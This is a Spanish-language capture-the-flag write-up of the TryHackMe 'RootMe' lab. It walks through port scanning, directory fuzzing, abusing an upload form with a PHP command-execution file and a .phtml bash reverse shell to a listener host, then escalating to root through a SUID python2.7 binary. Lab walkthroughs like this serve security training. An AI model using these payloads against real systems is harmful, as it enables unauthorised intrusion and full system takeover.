# RootMe

**Platforma** - TryHackMe  
**Difficultad** - Easy  
**Fecha** - Marzo 31, 2026  
**IP** - 10.146.154.92  
**OS** - Linux

---

RootMe CTF es un reto de TryHackMe de categoría fácil que requiere conocimientos de escaneo de puertos con Nmap, fuzzing web, ejecución remota de comandos (RCE) y escalada de privilegios en Linux. El vector principal de ataque es una vulnerabilidad de tipo RCE, explotada mediante la carga de un archivo malicioso en el servidor para así ganar acceso a una shell remota.

La forma en la que se trabajó este reto fue mediante los siguientes pasos.

1. Enumeración de puertos
    1. Análisis de servicios
2. Enumeración web (Fuzzing)
    1. Análisis de resultados e investigación sobre posibles vulnerabilidades
    2. Explotación RCE
3. Escalada de privilegios

## Enumeration

### NMAP

```bash
❯ sudo nmap -sV -sS 10.146.154.92
[sudo] password for parrot: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-26 17:14 CST
Nmap scan report for 10.146.154.92
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```

Después de realizar el escaneo de puertos podemos observar que únicamente se encuentran dos puertos abiertos:

- 22 - SSH (OpenSSH **8.2p1**)
    - Servicio de Secure Shell. No podremos hacer nada sin credenciales válidas.
- 80 - HTTP (Apache httpd 2.4.41)
    - Servidor web activo que merece una inspección detallada en busca de directorios ocultos, archivos sensibles o vulnerabilidades conocidas de esta versión.

### HTTP

![image.png](../assets/image.png)

Al inspeccionar el puerto 80, nos encontramos con una página que no contiene información relevante a simple vista. Sin embargo, esto no descarta la existencia de directorios ocultos, por lo que el siguiente paso es la enumeración de directorios.

### FFUF

```bash
❯ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.146.154.92/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.146.154.92/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 79ms]
panel                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 76ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 99ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 78ms]
:: Progress: [20000/20000] :: Job [1/1] :: 453 req/sec :: Duration: [0:00:52] :: Errors: 0 ::

```

Utilizando ffuf para enumerar directorios, la herramienta revela la existencia de los directorios /css, /panel, /js y /uploads, los cuales vale la pena inspeccionar ya que podrían contener formularios de carga o paneles de administración.

![image.png](../assets/image%201.png)

El subdominio /panel nos muestra que podemos cargar archivos al servidor eso es interesante, ya que podriamos inyectar un archivo con un comando malicioso para asi poder tenre una terminal remota.

## Explotation

```bash
❯ cat id.phtml
<?php echo shell_exec('id'); ?>
```

El directorio /panel expone un formulario que permite cargar archivos al servidor, lo cual es relevante desde el punto de vista ofensivo, ya que podríamos inyectar un archivo malicioso para obtener una shell remota.

Para comprobar si el servidor es vulnerable a RCE, comenzamos cargando un archivo PHP sencillo que ejecute el comando id y devuelva su salida.

![image.png](../assets/image%202.png)

El servidor devuelve la salida del comando id, lo que confirma que es vulnerable a RCE.

```bash
❯ cat shell.phtml
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.128.40/4444 0>&1'"); ?>
```

A continuación, creamos un payload que establezca una reverse shell para ganar acceso al servidor.

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.128.40] from (UNKNOWN) [10.146.154.92] 58760
bash: cannot set terminal process group (792): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-146-154-92:/var/www/html/uploads$ ls
ls

```

Mediante Netcat configuramos un listener para recibir la conexión entrante y así obtener la shell. Una vez recibida, procedemos a estabilizarla con los siguientes pasos:

1. Spawnear TTY con Python:
    
    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")’
    ```
    
2.  Pasar el proceso a background y configurar la terminal:
    
    ```bash
    Ctrl + Z
    stty raw -echo; fg
    ```
    
3. Ajustar las variables de entorno:
    
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```
    
    Con la shell estabilizada, el siguiente paso es escalar privilegios para obtener acceso como usuario root.
    
    ```bash
    www-data@ip-10-146-154-92:/$ find / -perm -4000 2>/dev/null
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/bin/newuidmap
    /usr/bin/newgidmap
    /usr/bin/chsh
    /usr/bin/python2.7
    /usr/bin/at
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/pkexec
    /snap/core/8268/bin/mount
    /snap/core/8268/bin/ping
    /snap/core/8268/bin/ping6
    /snap/core/8268/bin/su
    /snap/core/8268/bin/umount
    /snap/core/8268/usr/bin/chfn
    /snap/core/8268/usr/bin/chsh
    /snap/core/8268/usr/bin/gpasswd
    /snap/core/8268/usr/bin/newgrp
    /snap/core/8268/usr/bin/passwd
    /snap/core/8268/usr/bin/sudo
    /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core/8268/usr/lib/openssh/ssh-keysign
    /snap/core/8268/usr/lib/snapd/snap-confine
    /snap/core/8268/usr/sbin/pppd
    /snap/core/9665/bin/mount
    /snap/core/9665/bin/ping
    /snap/core/9665/bin/ping6
    /snap/core/9665/bin/su
    /snap/core/9665/bin/umount
    /snap/core/9665/usr/bin/chfn
    /snap/core/9665/usr/bin/chsh
    /snap/core/9665/usr/bin/gpasswd
    /snap/core/9665/usr/bin/newgrp
    /snap/core/9665/usr/bin/passwd
    /snap/core/9665/usr/bin/sudo
    /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core/9665/usr/lib/openssh/ssh-keysign
    /snap/core/9665/usr/lib/snapd/snap-confine
    /snap/core/9665/usr/sbin/pppd
    /snap/core20/2599/usr/bin/chfn
    /snap/core20/2599/usr/bin/chsh
    /snap/core20/2599/usr/bin/gpasswd
    /snap/core20/2599/usr/bin/mount
    /snap/core20/2599/usr/bin/newgrp
    /snap/core20/2599/usr/bin/passwd
    /snap/core20/2599/usr/bin/su
    /snap/core20/2599/usr/bin/sudo
    /snap/core20/2599/usr/bin/umount
    /snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core20/2599/usr/lib/openssh/ssh-keysign
    /bin/mount
    /bin/su
    /bin/fusermount
    /bin/umount
    
    ```
    
    #### Binarios SUID — Normales vs Sospechosos
    
    #### Normales — esperados en cualquier Linux
    
    Estos binarios necesitan SUID para funcionar correctamente por diseño del sistema:
    
    | Binario | Por qué es normal |
    | --- | --- |
    | `/bin/su` | Cambiar de usuario requiere acceso root |
    | `/bin/mount` / `umount` | Montar unidades requiere privilegios |
    | `/bin/fusermount` | Mismo caso que mount |
    | `/usr/bin/sudo` | Por definición necesita correr como root |
    | `/usr/bin/passwd` | Necesita modificar `/etc/shadow` |
    | `/usr/bin/chsh` / `chfn` | Modificar info del usuario en `/etc/passwd` |
    | `/usr/bin/newgrp` | Cambiar grupo activo |
    | `/usr/bin/gpasswd` | Administrar grupos |
    | `/usr/bin/newuidmap` / `newgidmap` | Namespaces de usuarios |
    | `/usr/bin/at` | Programar tareas requiere privilegios |
    | `/usr/bin/pkexec` | Autenticación de PolicyKit |
    
    Para la escalada de privilegios, enumeramos todos los binarios con el bit SUID activo en busca de alguno que nos permita elevar nuestros privilegios. Entre los resultados destaca /usr/bin/python2.7, el cual no debería tener SUID asignado. Consultando GTFOBins, encontramos que podemos aprovecharlo de la siguiente manera:
    
    ```bash
    www-data@ip-10-146-154-92:/$ python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    # whoami
    root
    ```
    
    Python nos permite escalar privilegios debido al bit SUID. Al tener este bit activo, el binario se ejecuta con los privilegios de su propietario (root) en lugar de los del usuario que lo invoca (www-data). El flag -p le indica al shell que preserve esos privilegios elevados en lugar de descartarlos al iniciarse, otorgándonos así una shell como root.